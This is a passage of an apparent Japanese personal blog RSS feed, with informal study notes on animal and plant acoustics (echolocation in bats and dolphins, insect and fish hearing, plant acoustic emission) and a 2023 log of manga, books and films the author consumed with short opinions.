      <description>コウモリ コウモリはオオコウモリとコウモリに分類されるが，エコーロケーションをしているのはコウモリである． オオコウモリは視覚で定位している． コウモリはなんで超音波が出せるのか気になるが，基本的な部分は人間と同じで， 咽頭筋肉の高速コントロールができているから，ということらしい．
コウモリのエコーロケーションには二種類あり，FM だけの信号と CF-FM 信号がある． 定常周波数をもつ CF のあとに FM を流すパターンと FM だけの二つ． CF 部分の長さや FM の長さによってエコーロケーションの種が変化する． 周波数が互いに混信することもあるが，これは互いに自身の周波数を調整することで回避している．
イルカ イルカは声帯を持たず，その鳴き声はパルス音と連続音(クリックスとホイッスル)に分別される． 音源が何か，ということは議論されているが，噴気孔周辺であると信じられている．例えば クリックスは噴気孔で圧縮された呼気が鼻道を通り，脂肪嚢を振動させることで発音されると知られている． しかし，この周波数の調整方法などは解明されていない．
イルカの額にはメロンという脂肪塊があるが，これは脂肪嚢から発せられた音の指向性を調整する． しかし，この指向性の調整はどちらかというと頭蓋骨の方が役割が大きく， メロンは水中とのインピーダンス整合を果たしていることが知られている．
一方で，イルカは聴覚も重要である．水中は暗いためである．そのためエコーロケーションが使われる． イルカにも外耳はあるが，完全に閉塞しており，音は聞けない．かわりに下顎骨から音を受信して内耳に伝える． 中耳の耳小骨や内耳の三半規管などの仕組みは哺乳類とほとんど一緒だが，蝸牛がとても小さい． これは，水中で激しく運動するような状況でも正しく定位できるように感度を高くするためである． ところで，イルカのエコーロケーションは，餌の探知が主な目的である．その波長が 餌となる魚によく反射するように選択されているためである． また，パルスが多すぎると受信と送信の対応付けができないため，受信してから次のパルスを送信している． このエコーロケーションを使うことで，イルカは初めて見る物体の視覚的な形を認識できるらしい． つまり，反射した音だけを聞いて，それがどんな形をしているかを認識することができる．すご
これまでのクリックスはエコーロケーションのためのものだった．一方のホイッスルは， お互いが群れではぐれないようなコヒージョンコールとして使われている． このホイッスルは個体によって差があり，生後約一年かけて学んでいくものである． また，イルカは血縁関係にあるイルカとそうでないものをこのホイッスルで聞き分けられる． これは周蓮変調に個体パターンがあるためである．
クジラ クジラは採餌の他に歌うことが知られている． 規則的な音の配列と階層的な構造から，ソングといわれている． このソングは必ずしも求愛のためではなく，同性同士での信号のやり取りにも使われていることがある． このソングの構造は種別に変化があり，構造などに違いがある．
ジュゴン ジュゴンも複数の鳴き声をもち，チャープスクイークの他に，短時間のトリルやバークがある． このチャープには，相対的な距離の把握機能があるといわれている．また，幼獣は会得していない トリルは，性的行為や活動的な場合に発声されることが多い． そのため，自信の内的モチベーションを伝達する役割があるらしい．
マナティー マナティーはジュゴンやクジラとは違い，主に複数の周波数帯域で構成されるハーモニクスを用いる． この鳴音は個体識別に使われており，雌雄や年齢に依存する持続時間や基音の変化に依存している． マナティーかわいいよね
鰭脚類 アザラシやアシカなどは鰭脚類に分類されるが，これらはさらに陸上交尾型・水中交尾型に分類される． 陸上交尾型(アシカやアザラシ)は一夫多妻制だが，このときのハーレム形成のために争いの一部として鳴音が使われる． また，幼獣と母親が鳴音で通信することもあり，これは多数の母子から互いを識別するために使われている．
一方で，水中交尾型はハーレムを形成することはできず，様々な繁殖方法が広まっている．その中で， 特に水中で交尾する際に呼吸穴をふさぐことが重要なので，そのための威嚇として鳴音が使われることがある． 加えて，遠くの個体に自身の繁殖状態を伝達し，交尾を加速する役割もある． これらの性質から，もちろん繁殖期はよく鳴くし，非繁殖期は頻度が落ちる．
ところで，この鳴音がソナーの役割をもつかは議論されている． 鳴音以外の発達した感覚器が多くあるため，ソナーをする必要はあるのか？みたいなところ． 暗闇でも餌を捉えられると同時にクリックスの頻度が高くなるらしいが，一方で，目隠しをした状態では頻度が上がることはなかったらしい．おもろ
バイオロギング 特に海洋生物などは，自然界に存在する状態でどのような音を発しているか， 周囲の音からどのような影響をうけているか，などをロギングする必要がある． しかし，音をそのまま録音して送信するような形式のものはばかりではなく， 例えばクリックスのパルス音の音圧レベルと受信自国だけをロギングしたり，音以外にも 加速度センサなどを一緒に取り付けていることもある．取得したい音の種類によって得たい情報が変化するためである． また，これらの装着も課題の一つにある．毛があれば毛につければいいが，イルカやクジラには吸盤が必要である．</description>
    </item>
    
    <item>
      <title>植物</title>
      <link>http://side-realms.github.io/sound/seedling/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/seedling/</guid>
      <description>植物と振動 植物が振動に伴って成長速度を変化させることは知られている． 例えば，ロイヌナズナは，モンシロチョウの幼虫による葉の摂食を，振動を通じて認識している． これにより，化学防御物質を出すことで，防御反応を示す． これは，風や他の昆虫の振動では全く反応しない． また，食虫植物とかは振動で獲物を獲得している．
こうした攻めの検知以外にも，例えば羽音を聞いたら，花蜜を積極的に増やすこともある． こうすることで，花粉の輸送を促進する． また，コウモリに花粉の輸送を依頼している植物は，その超音波を検知している． 特に，この検知に特化して受け皿(皿葉)をもっている
機械感覚 例えばオジギソウは，摂食があると反応する． こんなかんじで，機械刺激を感じることができる． ヒマワリが太陽の方を向いたり，海岸沿いの近くに生えた木は風下に向かって伸びるなどもこれ．
植物が発する振動 植物は acoustic emission という，ある事象により振動を発生させる特性を持つ． 植物は日中，気孔を開いて蒸散を行うことで，中の水ポテンシャルを低下させる(水の量みたいなかんじだろうか)． これにより，内部では水ポテンシャルの低下に伴って負圧が発生し，根っこから水を引き上げる． このとき，例えば水やりを急にやめたりすると，その負圧に耐え切れず，気孔から空気を入れるようになる． すると内部で気泡が発生する．これをキャビテーションという． この気泡が急速に成長するにしたがって， acoustic emission が起こる． これを見ることで，植物がどれだけ水が通りやすいか，みたいなことを感知することができる．</description>
    </item>
    
    <item>
      <title>虫</title>
      <link>http://side-realms.github.io/sound/bug/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/bug/</guid>
      <description>発音 昆虫はめちゃめちゃ小さいけどすごく大きな音を出すのすごいよな，っていう&amp;hellip; 魚類と同じように，遠距離では減衰しにくい音圧，近距離は減衰しやすい粒子速度が使われている．
摩擦
例えばコオロギは硬い表皮を持っているが，この方さにより特有の摩擦器官をもつ． 片方の翅にはギザギザがあるが，一方の翅には摩擦片とこすり合わせることで音が出る． このヤスリの部分のギザギザの個数やこすり合わせる速度によって周波数が変化し， 種類によっては 120 kHz までの音を出すものも存在する． こういった音が翅に共振して，遠くまで届く．コオロギだけでなくてもアリやガなども摩擦器官をもつ． また，翅にも限らない． 振動膜
セミとかめちゃめちゃうるさいよな．．． セミの中にはクチクラの膜がある．(生物のにできる硬い膜) このクチクラの膜が tymbal muscle によって収縮されることでパキパキと音がする． これが腹部のほとんどを占める空気によって増幅されることでめちゃめちゃ大きい音が出る． 打撃
体の一部を打ち付けて大きな音をだす種類が存在する． 例えばヤガは両羽の背側に特殊な構造を打ち付けて羽ばたく． 空気放出
笛と同じ．スズメガの幼虫は腹部の気門から空気を放出して音をだす． 防衛に使われることが多い． はばたき
これは主に近距離通信に使われる． 例えばミツバチは歩きながらはばたくことで，花蜜の場所を別個体に伝える．(ミツバチのダンス) 振動発声
虫の中には振動を自ら発生させる種も存在する． 例えばシロアリは木材に自分の頭を打ち付けて，振動信号をつたることで他の個体に警戒音を伝える． カブトムシの蛹は背面を蛹に打ち付けて，他の幼虫の接近を妨げる． コモリグモは腹部を植物に打ち付けて，求愛する． 受音 昆虫には弦音器官という，虫に特殊に発達した感覚器が存在する． これが空気中を伝わるおとや振動を受容する．
音受容器
脊椎動物と同様に鼓膜があり，鼓膜と気管，最後に感覚細胞がある． 感覚細胞は鼓膜からの振動でももちろん反応するが，気嚢のある内側からでも振動する． これは音源定位に使われる．すなわち，気管で連結している鼓膜が音圧の差を検知する． この鼓膜の位置も色々で，前肢にいる種もあれば，胸部や翅にもつ種もある． これは，捕食者(コウモリ)からの信号をとらえることにそれぞれ特化している． コウモリはエコーロケーションに超音波を発するが，これを効率的にとらえることが目的である． また，触覚にあるジョンストン器官は，粒子速度を受容する． 例えばオスの蚊のジョンストン器官は，触覚の先端の 7 nm ほどの動きを感知することができる． 振動受容器
例えば植物を伝わる振動は減衰しづらく，昆虫にとって感知しやすい． 膝下や，腿節内に存在する弦音器官がこの振動を受容する． このような振動受容器がある一方で，鼓膜期間をもたない昆虫も存在する． 先ほどのように，鼓膜をもたない昆虫も存在するが，鼓膜をもつ昆虫は音響情報を使って， つがいへの定位や，捕食者の回避を行う． この音源定位は，哺乳類のときと同様に，一対の鼓膜の左右からの入力差を使う． しかし，昆虫はめちゃ小さいので，左右差も少なく，信号処理などなんらかの部分で工夫が必要になる． 例えば，魚のときと同じように位相差を使うことが考えられる． また，コウモリのエコーロケーションを使って捕食者回避を行うのであれば，今のままでも十分という考え方もある． さらに，ヤドリバエという種は，音源定位に特化した特徴をもつ． それらはコオロギの幼虫に寄生するため，生きるために音源定位が不可欠ということらしい． ヤドリバエの鼓膜はシーソーのような形になっており，片方から入ってきた音の周波数に合わせて 鼓膜の角度が変化する． これによって，時間差が約 40 倍程度も増幅されることになる． さらに，これが有毛細胞へ伝わり，神経の発火となると，活動電位の潜時の関係で 1000 倍程度も増幅される． (潜時は，神経が応答するまでの遅延時間なので，大きい音に対する応答は速く，小さい音に対する応答は遅い．)</description>
    </item>
    
    <item>
      <title>見たものログ 2023</title>
      <link>http://side-realms.github.io/log/log/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/log/log/</guid>
      <description>2023 (6月~) 映画を見始めた一方でゲームは少なめだった． 映画って贅沢な時間の使い方だなあと思いつつ，もっといろいろ見ておけばよかったなとも思う． アニメに全然手を出せていないし今年は何の因果か全方位からガンダムを勧められたので来年はきっと観ます．．．
こういう感想を書くの最初は苦手だったけどだんだん書けるようになってきて楽しい． そして語彙力の無さを痛感する．．．
「ほんとうにつらい」ではなくてそれを言語化できるようになりたい
本マジで読んでなくて反省
Vtuber を狂ったように見ていた． 特にぽこピー・ミミック・おむらいす食堂あたり
個人勢マジでおもしろいな．．．
あおぎり高校もよかった
漫画 ジョジョの奇妙な冒険：一部 岸部露伴は動かない ブルーピリオド 呪術廻戦 禪院真希かっこよすぎる．覚醒前も後も好き ブルーロック 絵，うますぎない？ 千切豹馬すき チェンソーマン 落下の悪魔のデザイン良すぎる 東京卍リベンジャーズ 三ツ谷と場地がかっこよすぎる ルリドラゴン 絵もかわいいしシナリオもローカルなファンタジーって感じがしてすごく好き 休載つらい&amp;hellip; 安静にしてください&amp;hellip; 光が死んだ夏 神系のホラーはよくあるけど切り口が新しくてとてもいい あかね噺 朱音かわいいね．．． 落語見てみようかな サンダー3 GANTZだと聞いていたけど思ってたよりGANTZだった 二頭身シーンの絵がすごいかわいい 壮大な話だと展開が遅く感じてしまうな 亜人 戦闘シーンかっこよすぎる 「死なない」だけだと直接の強さにならないけど使う人が使うとこんな使い方があるんだと思う 刷ったもんだ！ 印刷業全く知らなかったから勉強にもなる ムルシエラゴ いや，下心はないんで 黄泉のツガイ 荒川弘の新作，アツすぎる キャラクターが多いのにちゃんと覚えられるのはキャラが立ってるからだろうと思う リバイアサン 劇画が話と合ってていい 裏バイト 死体清掃の回が一番怖い 不死身のパイセン ホラーコメディかと思ったら油断した アフターゴッド つらい 絵がうますぎる，部屋とか建物の絵が異常にうまい 「綺麗な顔」を描くのもうまい これまで言葉でしか語られなかった心情を悲劇の過程で具体的に絵で描く，みたいな，最悪の事態の結果，誰かからの愛を知ることになる，みたいな，そういうどうしようもない感情を描くのがうまい 僕の部屋のユウ子さん 泣いちまったよ この世は戦う価値がある はぐれ人魚のディアナ 江口さんはゲーム脳 雷雷雷 あくたの死に際 怪異と乙女と神隠し 一勝千金 ヴァンピアーズ 合コンに行ったら女がいなかった件 一昔前の二次創作みたいな絵柄でめちゃめちゃ好き pixiv 漁ってた頃を思い出す ウェルベルム よくある殺し合い漫画だけど殺しに重きを置いてないのがいい 絵もいい 鉄コン筋クリート ネズミ，かっこいいよ クロのつらさとかシロの強さが絵柄にあってると思う ピンポン ペコかっこいい 多分星野が主人公だと思う．そうであってほしい それでも町は廻っている 7億周くらい読んでる 時系列シャッフルすごくおもしろいからどこかで一回まとめたいな 歩鳥がただの天然じゃなくて意外としっかりしてるところがあってキャラ倒れしてないのが本当に好き 真田との関係も多くは語らないし，多分歩鳥自身もまだ日常が続いてほしいと思っているんじゃないかと思う(にしんそばの話にもあったような感じ) 小ネタの数とか細かい伏線が回収されていて，どこまで想定して描いてるのか分からなくて怖くなる たけるとエビちゃんの話ももっと読みたかった 不安の種 初代はマジで怖かったけどアスタリスクの方はオムニバスっぽくてあまり怖くない タコピーの原罪 胸糞エンドじゃなくてほんとうによかった ROPPEN 話がただ殺し合うだけじゃなくて面白い 政治を黒幕に出すんじゃなくて初めから出てくるのは印象がいい 極楽街 絵がうますぎる ダラとネイがかわいい 個人的に一番アツい パラレルリープシンドローム 絵がかわいい ただのタイムリープ系かとおもったらもう一つひねってていい 変な家 間取りの理由が一巻だけで終わりならイマイチだったけど予想以上に広がってておもしろい おやすみプンプン これを鬱漫画だと褒めたたえる人間と仲良くなれない プンプンの半生を南条視点で描いている プンプン視点の話はおそらくラスト3話だけ プンプン自身が声を発しているのも愛子ちゃんとの回想シーンだけ 死にたがっているプンプンが南条に飼い殺されるエンドなのでプンプンにとってはバッドエンドだと思う 愛子ちゃんはずっと「運命」「信仰」みたいなものを意識していて，多かれ少なかれ母が信仰する異常な宗教の影響はあったんだろうと思う 愛子ちゃんが自殺する直前は多分彼女にとって一番幸せな瞬間で（運命の人と両想いになれている，っていう話から），その瞬間を残しておきたかったからなのか，それともプンプンの記憶に一生残り続けたいからなのかはよく分からないけど結局死んでしまった 最終巻，七夕の日にプンプンが愛子ちゃんの夢を見るシーンは本当につらかった 殺人を共有して，最終的に目の前で自殺されてしまってもプンプンは愛子ちゃんのことを忘れていってしまうっていうのが救われない（覚えていたらそれはそれで） 最後まで現実と戦ってた南条の勝ち（表現が正しいかはわからないけど）なんだろうと思う 愛子ちゃんと南条の印象が大きすぎるけどプンプンママ好きだった 暗殺教室 久しぶりに読んだ アニメの方がよかった 鋼の錬金術師 久しぶりに読んだ 絵がうまい ロイアイって無いんですか&amp;hellip;そうですか&amp;hellip; BANANA FISH 寝込んだ 最後のがやりたかっただけだろ！って思いながら寝込んだ 奇子 閉鎖的な，ムラ的な雰囲気が感じられていい 奇子が異常にエロくて手塚治虫のキモさを感じた．エロいというよりグロいかもしれない 近親相姦の背景があるからだと思う 奇子周りが全滅するか否かが単行本と連載版の違いらしい 敗戦国である日本に漂う角張ったプライドと閉鎖感と人間の業の深さ，それに対抗する人間の力強さ（？）みたいなものが色んな人を通して描かれている． 奇子は自らの意思で運命に抗っているようには思わないけど，結果的にそうなっているように見える 下山事件を踏まえつつ，一族の複雑な関係を描いていて怖い 続きがあるのか，もう少し長く描いてほしかった どろろ どろろかわいいね もう今更妖怪の造詣に感動することはないが，この時代のクオリティにしては高すぎるとは思う 最初に地獄堂で祈る場面は異常に絵がうまくて感動した 夢幻紳士 絵がかわいい こんなに仰々しい絵をしているのに話の気が抜けてていい ソラニン 女の子はかわいい バンドの道を進むことを信号無視と対比してその結果失敗する，っていう表現はいいけど自分で解説しちゃうのが寒い うみべの女の子 女の子はかわいい 大瀧詠一の 1st 聴いてる女子高生良すぎるだろ 最後にフラれた小梅の表情好き ネムルバカ マジでよかった 変な余韻を残したり深いような表現をしないで，ただ一般の日常が流れるように鯨井が消息を絶つのがすごく切ない 虹ヶ原ホログラフ すごくよかった，浅野いにおは中身のない漫画よりこういう SF を描いてほしい(身勝手) 妖怪の「件」を中心に据えた構成 タイムラインがごちゃまぜになってて考察の余地が広い ブリキ缶はなんだ？ 件の持つ能力をブリキ缶に対応させているとするなら，鈴木は予言の力をもたないことになる 鈴木の本名(天彦)は天人の意味をもつから，鈴木は件としての力ももち，天人としての力ももつことになる． 「強い意志をもちなさい」というセリフは件の力を持ちながら行使するな，ということだと思う 1999 素晴らしき日々 ひかりのまち 零落 世界の終わりと夜明け前 デッドデッドデーモンズデデデデデストラクション すごくよかった ラストの「時空が歪んじゃうよ！」っていうのは，戦争中の世界からの凰蘭と門出がタイムマシンを使ってタイムリープ後の世界に来たから発言しているのだと思う（リープ後の門出たちと戦争中の門出たちが鉢合わせてはいけない）．リープ後の凰蘭は「はにゃにゃふわ～～」なんて言ってないし なので戦争中の凰蘭と門出は生きているんじゃないだろうか タイムリープの話が出たときはテンション上がった．これくらい壊してくれていい どうせなら戦争中の世界で話を終わらせてほしかったがまあ難しいんだろうな．．． うずまき 最高 ドラゴンヘッド かなり怖いけど大好き ずっと酸素が薄い感じがする 火災旋風のあたりから本当に怖くなった 海辺へ行く道 純文学みたいな感じがする 白黒なのに空とか海が青いように見える 密度が濃いというか一週間に一冊くらいがちょうどいい 透明通信 きれいなつげ義春 夜空が銀河鉄道の夜みたいな雰囲気を感じる マッチ一本がよかった ウツロボロス エグい 丸尾末広の系譜なんだろうがただの性癖さらしになっててキツいと思ってしまう Present for me ヒーローの話が好き よつばと！ 季節の表現が上手ですき つげ義春全集 ねじ式 ★ ゲンセンカン主人 夢の散歩 アルバイト 雨の中の慾情 夜が掴む コマツ岬の生活 外のふくらみ 必殺するめ固め ヨシボーの犯罪 ★ 窓の手 夏の思いで ★ 懐かしいひと ★ 事件 ★ 退屈な部屋 ★ 日の戯れ ★ 外天楼 きちい 阿呆にも歴史がありますの 空気の底 処刑は3時に終わった ジョーを訪ねた男 夜の声 野郎と断崖 グランド・メサの決闘 うろこが崎 暗い窓の女 ★ そこに穴があった ★ わが谷は未知なりき 猫の血 ★ 電話 カメレオン 聖女懐妊 ★ カタストロフ・イン・ザ・ダーク ロバンナよ ふたりは空気の底に ★ 人間昆虫記 十村十枝子は本名がウスバカゲロウからきているらしい(臼場かげり)．アリジゴクってことですね． 十村が芥川賞を受賞したシーンから始まるが，物語が進むにつれて十村は様々な人の作品を模倣して活動していることが分かっていく．作家として，演出家として名を上げた十村の作品は模倣（なんならそのままパクリ）によって成立していることが分かる． 模倣された側の人間は様々な方法で破滅していく 十村はずっと「満たされない」みたいなことを主張して，蝋人形の母親にすがっているが，これは模倣ばかりで中身がない活動ばかりしているから，という単純な理由だと思う 世間から見れば十村の作品が模倣だろうがオリジナルだろうが関係ない，という二面性も作品の芯だと思う ユニコ ユニコまじでかわいい 家族と会う話が一番好き コーンが可愛すぎる あの終わり方切なすぎるだろが アドルフに告ぐ 記者である峠草平のもとに弟から連絡があり，「重要な書類を預かってほしい」と頼まれる 草平が弟のもとを訪れると，重要書類は無事だったものの既に弟は惨殺されている その重要書類の内容は「アドルフ・ヒトラーが，実はユダヤ人の血を引いている」というもの(フィクション) この書類をめぐっていろんな人が争うことになる アドルフ・カウフマンが特に気になった 日本とドイツのハーフであり，最初は日本に居続けたいと思っているが，だんだんとナチズムに染まってしまう 言わずともアドルフ・カミルとの関係性が徐々に変化していくのは心を削られる カミルの父親を殺してしまうシーンはカウフマンの人種に対するコンプレックスがあらわれていると思うし，ここで「ユダヤ人を殺す」ことを手段の選択肢として持ってしまうことが印象的だった WW2後にナチスが崩壊した後も描いている ユダヤ人は自分たちの祖国をパレスチナに建設しようとする もともと住んでいたアラブ民族がそれに反抗する 最後に「おれの人生は何だったんだろう」とつぶやくカウフマンが切ない 結局それぞれに正義があって，その証明としてもっとも単純なのが戦争だっていうことだと思う そんなものが正義だと思わないけど，当事者でもなく，寝転びながら手塚治虫を読んでいられるような自分が浅薄に意見できることでもないとも思う リボンの騎士 リボンの騎士 野ばらの精 虹のプレリュード 双子の騎士 リボンの騎士よりも少女漫画っぽい ジャングル大帝 W3 素晴らしい終わり方だと思う きりひと讃歌 新選組 時代考証がハチャメチャで色々騙された 本 豊井裕太 水と手と目 大阪圭吉 とむらい機関車 デパートの絞刑吏 灯台鬼 花束の虫 香水紳士 銀座幽霊 動かぬ鯨群 あやつり裁判 寒の夜晴れ 石塀幽霊 死の快走船 小酒井 不木 恋愛曲線 岡本かの子 鮨 坂口安吾 白痴 桜の森の満開の下 エドガーアランポー アッシャー家の崩壊 黒猫 早すぎる埋葬 ウィリアム・ウィルスン 岡本綺堂 青蛙堂鬼談 異妖新篇 三島由紀夫 レター教室 逢坂冬馬 同志少女よ、敵を撃て 映画 戦場のメリークリスマス キスされたときの坂本龍一の演技が迫真すぎて笑ってしまった 鬼気迫ってるわけでもないが平和と命の危機がうっすら共存している雰囲気がとても怖い 特に何もなくてもストレスがかかる ほんとうにつらい 最強のふたり もう少し大人になったら分かるんだろうか 8 1/2 名画らしいので見たが，過去・未来・妄想・夢が入り混じったつくりになっていて理解できない部分が多かった カトリックの話がよくでてきていて，主人公自身もカトリックにいい思い出はなさそうだったが，それが話にどう関わっているかはわからない 妻との仲もよくなく，それもそのはずで，妻との旅行でも全く抱こうとせずに映画監督は出演希望の女性ばかりに目を向けている 映画の撮影が始まらない中で，プロデューサーたちは主人公を催促するためにセットを作ったりカメラテストをしたり，撮影直前の記者会見を開いたりと，取り返しのつかない状況を作る 主人公は当然何も話せず机の下にもぐってしまい，最終的にはポケットの中の拳銃で自殺する．．．という妄想をする．当然生きているが映画監督としてのキャリアはもう死んでしまった 一方で妻とは急に和解していて（理由はよくわからなかった），また最後のシーンでは「人生は祭りだ．共に生きよう」と言って過去の人たち全員がおそろいの衣装で輪を作って踊る．最終的に少年だった自分（白い衣装に変わっている！）が退場して終わる ここまで見てやっと最初のシーンが理解できた．映画製作から逃げたい自分（空に浮かぶ自分）とそれをよしとしない周囲の関係者たち（グイドの足をヒモでつないで引き下ろそうとする）ということだろうか カッコーの巣の上で 刑務所逃れのために精神病を詐称したマクマーフィは精神病院に入院するが，その精神病院では婦長の管制下に置かれた生活を強いられる．マクマーフィはその環境に色々反発して最終的に脱走を試みるが．．．みたいな話 鬱エンドかと思ったらそうではなかった なんとなくチーフが鍵なんだろうなと思ってたらもはや主役だった カッコーの巣は英語で精神病院の蔑称らしい．そう考えてもチーフの話なんだなって感じがします 正直アメリカのここら辺の歴史(1960)は全く分からない．ネイティブアメリカンは現在約 7 割が都市に移住しているらしいが（正確な数字は分からない），この都市移住計画は結局ネイティブアメリカンの生活状況の改善に至らず，社会の同化も達成できなかった．結局，解体された部族と差別・貧困だけが残されたネイティブアメリカンはホームレス，アル中みたいな問題に巻き込まれてしまう．アメリカ政府にとって異質ななネイティブアメリカンを，管制下で管理し，正常な社会に同化させようという流れはこの精神病院と似ている．マクマーフィは管理から反発するが，結局ロボトミー手術によって無力化されてしまう．どれだけ抗っても社会の大きな流れを変えることはできないという鬱エンドかと思ったが，チーフは誰もが無理だと思っていた給水場を破壊し持ち上げ，窓を割って脱出する チーフがマクマーフィを殺した経緯はよくわからなかったが，ネイティブアメリカンにとって死は魂が肉体から解放されるという意味で救済らしいので，無力化されたマクマーフィを救済したんだろうと思う イージーライダー アメリカ人の二人が麻薬取引で手に入れた大金をもとにバイクに乗って色々する話 本当に自由であることを求めて旅する二人は当時のアメリカ人にとっては有害なのか単にヒッピーだからなのかは知らないが迫害をうける アメリカが説くような自由はあくまである程度制約をうけたうえでの自由であり，本来の意味で自由だと劇中の麻薬は当然殺人も許可されるような環境になる．結果，映画のようにあっけなく殺されてしまうんだと思った アニーホール コメディ部分は面白い ウディ・アレンの度量の狭さというか自分の価値観からしかものを見れない性格はなんともいえない 最初はうまくいっていても物理的に空間を共有し始めるととたんに互いのいやなところが見え始めて（それが同棲だろうけど）距離をとろうとするが，距離を取った瞬間にその虚無感を他責で埋めようとする（僕を愛していたくせに，みたいな）感じ さらば冬のかもめ 自分でなんとかできることを分かっているニコルソンとできないことの区別がついてないラリーの対比がよかった あっけなく分かれてしまうのも自分ではどうしようもない感じがしていい グリーンブック 人種差別というよりはマイノリティに焦点を当てた映画だと思う．ドンは黒人だけどそれ以上に孤立しているし両性愛だし，みたいな 時代が変われば価値観も変わるので，この時代にこれだけ乱雑に生きることができた人たち（主人公）と丁寧なくらし（現代から見れば当然のふるまいだけど）を意識している人が対立するのは当然で，この価値観とかを互いに分け合っているように見える 贖罪のようにこういったテーマの映画を作っていると思われるかもしれないし，まあ当人からしたらあんまりおもしろくはないと思う パーマネントバケーション アンチドラマをテーマにしているらしく，けだるい感じで何も起こらない退屈なものから逃げ出すことはできない，みたいなことを伝えたいらしいがよくわかっていない 単に不良の自分に酔っているような気もした ゴッドファーザー まだ 1 しか見てない 弁護士のトムが一番好き ブルーアワーにぶっ飛ばす 夏帆とシムウンギョンが出演していて，夏帆とシムウンギョンは親友という体で描かれているが，実はシムウンギョンは夏帆のイマジナリーフレンドで，夏帆は田舎を嫌う自分，シムウンギョンは田舎を好きになりたい自分ということらしい イマジナリーフレンドだろうというのは最後の夫が部屋を横切るシーンで分かったが，そうするとつじつまが合わない場面が多々ある 夏帆がもともと田舎を嫌っていた理由とか悩んでいる原因とかもよくわからない．田舎を嫌っていそうな雰囲気は伝わるけど（両親とか兄の漢字から）悩み事については特に言及されていない その男，凶暴につき ソナチネ キッズリターン ラヂオの時間 唐沢寿明あんなかっこいいの？？ スタンドバイミー つらくなってしまったよ かもめ食堂 映像がきれいだった．北欧だからなのかは知らない あいつ最後までコーヒータダ飲みしてったな ピンポン あの髪型でまともに映れるの窪塚洋介だけだろ．．．まじで結婚してくれ mid90s レイがかっこよすぎる ああいう不幸に憧れるというか，やる気がない方がかっこいいみたいな雰囲気って中学生くらいに体験したなあと懐かしくなった 桐島，部活やめるってよ Lock, Stock and Two Smoking Barrels バイオレンスかと思ったけど意外とコメディだった ヴィニー・ジョーンズかっこいい タクシードライバー 確定してしまっている貧する自分の未来とかベッツィーに激昂されてしまった怒り 店で強盗を銃殺するのがきっかけで自信がついてしまって，無駄にアイリスを救おうとする アイリスにとっては今が楽なので救ってもらおうみたいな考えはない トラヴィスがモヒカン＋サングラスにしたときは怖かった スポーツと娼館のおじいさんを殺して自殺しようとするが最後は弾切れで死ねない 最後自殺できてたら丸く収まっていたと思うけどトラヴィスが野放しにされているのが結構怖い 都会のアリス アメリカに失望した主人公は自分を見失っていた(写真を撮っても薄っぺらい，仕事もうまくいかない) どこの国にもアメリカに対する憧れがあったんだろうか 主人公がアリスと一緒に旅をする，他者を受け入れることで自分以外の価値観を得，状況を打開するような映画 結局主観的にしか物事を見ることができなかった主人公が視点を広げることができたという話だと思う 今の自分ではよく分からない 主人公犯罪者に間違われそう CURE ほんとうに面白かった 直接言ってるように青髭をプロットの元にしている 間宮は自我を喪失している精神病患者で，研究していた催眠術のようなものを用いて人間の自我を引き出すことができる この自我は無意識下に存在する自分の欲求(?</description>
    </item>
    
    <item>
      <title>魚類</title>
      <link>http://side-realms.github.io/sound/fish/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/fish/</guid>
      <description>魚類の聴覚 水中では，音は縦波の圧縮波として音圧を，近距離では水粒子の動きとして感知される． 魚類も同様に聴覚があり，内耳を用いて圧縮波を感知する一方で，近距離の水粒子の動きを側線で感知する． 魚の内耳は，一方で蝸牛がない．三半規管の下に配置されている3つの嚢の中に有毛細胞が存在し， それぞれが耳石と連携している． 音によって魚の体が振動するが，耳石は魚の本体と比べて比重が3倍大きいので，その振動から位相が遅れる． このずれが有毛細胞全体を倒すことになり，チャネルが開く． これとは別に、鰾を使って音を感知できる魚類もいる． つまり，鰾が内耳とつながっていて，音圧によってこの鰾が振動する． このように，鰾を使うと音の圧力変化(スカラー量)をよく感知することができる． つまり，遠距離からの音圧を感知することができる 一方で，鰾が内耳と連携していない魚類は，前述のとおりベクトル成分しか感知することができない． つまり近距離の粒子運動しか感知することができない．
人間など陸上動物が鼓膜を使うことができる理由は，空気よりも音響インピーダンスが高い 肉体をもつためである． この肉体に固定された鼓膜の振動として，音をスムーズに感知することができる． 一方で，魚は水と音響インピーダンスの差がほとんどない． そこで，耳石が使われることになる． 多くの魚の周波数感度は低く，おおむね 2 kHz 以下の周波数帯域である．
音源定位 魚は音源の位置が学習できなかったという報告(ハヤ)がある一方で， 威嚇音を使った追い込み漁や，求愛のために魚が音を発する例もある． 実際には水平方向，垂直方向に識別できることが知られている．
人間は両耳の強度差や時間差を使って音源定位をする一方で， 魚類はわからないことが多い． 人間は頭部が貫通する音が減衰することから強度差を求めることができるが， 魚類は周りの水と同じように体組織が音を通過するため，強度差を計測することができない． また，水中の音速も空気中の 5 倍程度であり魚類の左右の耳の距離も考慮すると 時間差を考えることも難しい． こういったことから，現在では鰾を用いて感知される音圧の位相差を使って音源定位をすることができる といわれている．
発音する魚 発音する魚が存在する．例えば繁殖期や，幼魚が生息場所に戻るため， 逃走行動など様々な手段がある． 加えて，コーラスのような現象がみられる魚類も存在する． ただ，ごく限られたグループだけが(10%)鳴くらしい． この「鳴く」の定義は，鳴くことのための器官が存在するということとされている．
この発音方式は主に二つ存在する． 一つは発音筋の振動音である．発音筋の振動が鰾で共鳴することで発音される．ピラニアとか． もう一つは骨の摩擦振動である．シロホンのように，くぼみの付いた骨がこすられることで音が発せられる．
例えばスズメダイを例に挙げると， 繁殖行動の際は，営巣のときに音を出す．メス用の産卵場所の準備が整ったことを知らせる． また，攻撃行動の差異にも音を出す．卵を食べる捕食者を見つけたときに追い返すための音である． また，求愛の差異にも音を出す．オスはループ状の遊泳とジグザグ遊泳によってメスを誘引するが， メスとのつがいが見つかって，巣までひきつれる際にオスは発音をし続ける．
